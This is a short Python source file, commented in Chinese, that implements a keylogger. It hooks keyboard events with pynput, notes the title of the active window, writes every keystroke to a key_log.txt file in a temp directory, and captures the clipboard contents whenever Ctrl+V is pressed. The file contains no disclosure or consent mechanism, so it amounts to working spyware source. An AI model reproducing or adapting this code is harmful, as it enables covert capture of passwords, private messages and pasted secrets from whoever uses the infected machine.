import os
import win32clipboard
import threading
from pynput import keyboard
from  ctypes import *
class Hook:
    def __init__(self,path):
        self.path=path
        self.window_name_value=['no']
        Keyboard_Thread = threading.Thread(target=self.Start_Keyboard_Lsisten)
        Keyboard_Thread.start()
    def window_name(self):
        user32 = windll.user32
        kernel32 = windll.kernel32
        hwnd = user32.GetForegroundWindow()#获取句柄
        window_title = create_string_buffer(512)
        user32.GetWindowTextA(hwnd, byref(window_title), 512)  # 指定句柄获取窗口名
        value = window_title.value
        kernel32.CloseHandle(hwnd)
        return value.decode('gbk')
    def Start_Keyboard_Lsisten(self):
        with keyboard.Listener(on_release=self.keyboard_on_release) as KeyboardListener:
            KeyboardListener.join()
    def keyboard_on_release(self, key):  # 键盘弹起时的操作
        if self.window_name_value[0] =='no':
            self.window_name_value[0]=self.window_name()
        value=self.window_name()
        with open(self.path+'key_log.txt','a') as a:
            if value != self.window_name_value[0]:
                self.window_name_value[0] = value
                a.write('[Window+name]:'+str(value)+'\n')
            a.write(str(key)+'\n')
            if '\\x16'in str(key):
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                a.write('[Ctrl+V]:{'+data+'}'+'\n')
if __name__ == '__main__':
    #Hooks = Hook()
    if os.name=='nt':Hooks = Hook('C:\Temp\\')
    else:Hooks = Hook('/tmp/')
